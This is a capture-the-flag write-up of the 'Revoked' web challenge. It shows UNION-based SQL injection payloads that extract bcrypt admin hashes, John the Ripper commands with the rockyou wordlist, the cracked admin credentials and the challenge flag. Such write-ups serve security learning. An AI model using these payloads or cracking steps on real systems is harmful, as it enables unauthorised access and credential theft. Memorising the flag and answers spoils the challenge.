
# 🌐 Category: Web / SQL Injection / Hash Cracking

#technique/sqli #technique/union-injection #technique/hash-cracking #tool/john-the-ripper #category/web

---

## 📘 Description

The **Revoked** challenge involves a "personnel index" application created by an intern. The goal is to prove that the budget-saving solution is insecure. By exploiting a search or profile function, it is possible to perform a **UNION-based SQL Injection** to exfiltrate administrative password hashes and crack them to gain unauthorized access.

---

## 🛠 Tools Used

- **Browser:** To interact with the web application and perform the SQLi.
- **John the Ripper:** To crack the retrieved Bcrypt hashes.
- **Rockyou.txt:** Standard wordlist for password cracking.
    

---

## ⚙️ Methodology

### 1. Initial Recon & Account Creation

A standard account was created to access the application's internal features. ![[01_Revoked.png]] ![[02_Revoked.png]]

### 2. SQL Injection (Data Exfiltration)

The search functionality was found to be vulnerable to SQL Injection. A `UNION SELECT` payload was used to extract password hashes directly from the `users` table.

**Payload for Admin:**

```sql
' UNION SELECT 1, password_hash, 'fake_email', '1' FROM users WHERE username='admin' --
```

**Payload for Admin1:**

```sql
' UNION SELECT 1, password_hash, 'admin1_hash', '1' FROM users WHERE username='admin1' --
```

![[03_Revoked.png]]

**Retrieved Hashes:**

- **Admin:** `$2b$12$hw4THvDN67pDZU830KBqceIHcajhSNwpR7VUTNapdrVHsNRS4mpJG`
- **Admin1:** `$2b$12$.XUQiEpWWY72XNAxZ8jd/.RLv79WkF9RwMRwPTHM4vm7nF9w/RV6.`

### 3. Hash Cracking

The extracted hashes use the **Bcrypt** algorithm (indicated by `$2b$`), which is computationally expensive. **John the Ripper** was used with a wordlist to identify the plaintext passwords.

```bash
# Save the hash to a file
echo '$2b$12$.XUQiEpWWY72XNAxZ8jd/.RLv79WkF9RwMRwPTHM4vm7nF9w/RV6.' > hash.txt

# Run John with the rockyou wordlist
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Faster attempt using top 10k passwords
head -n 10000 /usr/share/wordlists/rockyou.txt > top10000.txt 
john hash.txt --wordlist=top10000.txt 
```

### 4. Exploitation

Using the cracked credentials, I logged into the application as an administrator.

- **Username:** `admin1`
- **Password:** `pass`

![[04_revoked.png]]

---

## 🏁 Flag

`Hero{N0t_th4t_r3v0k3d_ec6dcf0ae6ae239c4d630b2f5ccb51bb}`